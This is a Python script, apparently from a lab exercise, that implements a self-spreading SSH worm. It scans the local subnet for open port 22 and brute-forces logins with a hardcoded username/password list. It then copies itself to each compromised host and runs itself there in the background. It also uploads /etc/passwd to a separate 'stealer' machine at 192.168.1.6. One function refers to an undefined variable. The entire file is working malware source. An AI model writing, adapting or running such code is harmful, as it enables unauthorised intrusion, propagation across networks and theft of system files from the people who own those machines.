import paramiko
import sys
import nmap
import os
import os.path
import socket, fcntl, struct
import netifaces

markerLocation = "/tmp/pass_marker.txt"
stealersIp = "192.168.1.6"

wordList = [
('awesomeUserName', 'badPassword'),
('awesomeHacker101', 'password'),
('ubuntu', '123456'),		#VM1
('best_username', 'awesomePassword'),
('ubuntu', 'password'),		#VM2
('ubuntu', 'password1') ]	#VM3

def getHostsOnTheSameNetwork():
	
	# Create an instance of the port scanner class
	portScanner = nmap.PortScanner()
	
	# Scan the network for systems whose
	# port 22 is open (that is, there is possibly
	# SSH running there). 
	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
		
	# Scan the network for hoss
	hostInfo = portScanner.all_hosts()	
	
	# The list of hosts that are up.
	liveHosts = []
	
	# Go trough all the hosts returned by nmap
	# and remove all who are not up and running
	for host in hostInfo:
		
		# Is ths host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)
	
	
		
	return liveHosts


# Find if the target has already been infected with our worm
def isTargetInfected(ssh):

	infected = False
	try:
		sftpClient = ssh.open_sftp()
		     
		# Check if the file exists
		sftpClient.stat(infectionMarker)
	 
		# The system is already infected
		infected = True
		print("Target is already infected!!")
	except:
		print("Target should be infected!!")

	return infected



def markSystem():
	marker = open(markerLocation, "w")
	marker.write("Dont forget to place witty remark here...")
	marker.close()


def getMachineIp():
	# Get all the network interfaces on the system
	networkInterfaces = netifaces.interfaces()
	
	# The IP address
	ipAddr = None
	
	# Go through all the interfaces
	for netFace in networkInterfaces:
		
		# The IP address of the interface
		addr = netifaces.ifaddresses(netFace)[2][0]['addr'] 
		
		# Get the IP address
		if not addr == "127.0.0.1":
			
			# Save the IP addrss and break
			ipAddr = addr
			break	 
			
	return ipAddr
	


def attackHost(host):

	global wordList

	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	numTries = 0

	for (_username, _password) in wordList:
		try:
			ssh.connect(host, username=_username, password=_password)
			return (ssh, _username, _password)
		except:
			numTries = numTries + 1

	return None


def sendPasswords():
	global stealersIp
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(stealersIp, username="ubuntu", password="123456")
	sftpClient = ssh.open_sftp()
	currIp = getMachineIp()
	sftpClient.put("/etc/passwd", "/home/ubuntu/SSH_Worms/passwd_"+str(currIp) + ".txt")



markSystem();

if len(sys.argv) == 2:
	if sys.argv[1] == "-host":
		print("Will mark and spread worm but won't steal its own password!")
else:
	sendPasswords()

network = getHostsOnTheSameNetwork()

print network

for Host in network:		

	print ("Trying host: " + Host)
	sshInfo = attackHost(Host)

	currIp = getMachineIp()

	if sshInfo and Host != currIp:
		print("Success! Got in!!")
		
		if isTargetInfected(sshInfo[0]) == False:
			print("Spreading to this machine: %s" %(str(Host)))
			try:
				sftpClient = sshInfo[0].open_sftp()
				sftpClient.put("password_worm.py", "/tmp/" + "password_worm.py")
				sshInfo[0].exec_command("chmod a+x /tmp/password_worm.py")
				sshInfo[0].exec_command("nohup python /tmp/password_worm.py &")
			except:
				print ("Something went wrong")

print("Finshed being wormy!!")

	




